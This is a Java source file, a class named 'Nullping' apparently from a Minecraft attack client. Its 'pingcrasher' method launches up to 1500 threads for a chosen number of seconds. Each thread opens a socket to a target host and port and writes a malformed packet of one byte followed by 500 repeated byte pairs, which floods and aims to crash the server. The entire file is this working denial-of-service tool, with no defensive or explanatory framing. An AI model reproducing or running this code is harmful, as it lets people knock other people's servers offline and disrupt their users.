package neko.itskekoffcode.clientapi.utils;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;


public class Nullping {
    public static int threads = 0;

    public static void pingcrasher(String ip, int time) {
        String timebefore = time + "000";
        int time1 = Integer.parseInt(timebefore);
        long time2 = System.currentTimeMillis();

        do {
            if (threads < 1500) {
                (new Thread(() -> {
                    ++threads;
                    ping(ip.split(":")[0], Integer.parseInt(ip.split(":")[1]));
                    --threads;
                })).start();
            }
            ThreadUtils.sleep(1L);
        } while(System.currentTimeMillis() - time2 < (long)time1);

    }

    public static void ping(String host, int port) {
        try (Socket socket = new Socket(host, port)) {
            DataOutputStream out = new DataOutputStream(socket.getOutputStream());
            out.write(-71);

            for (int i = 0; i < 500; ++i) {
                out.write(1);
                out.write(0);
            }
        } catch (IOException ignored) {}

    }
}
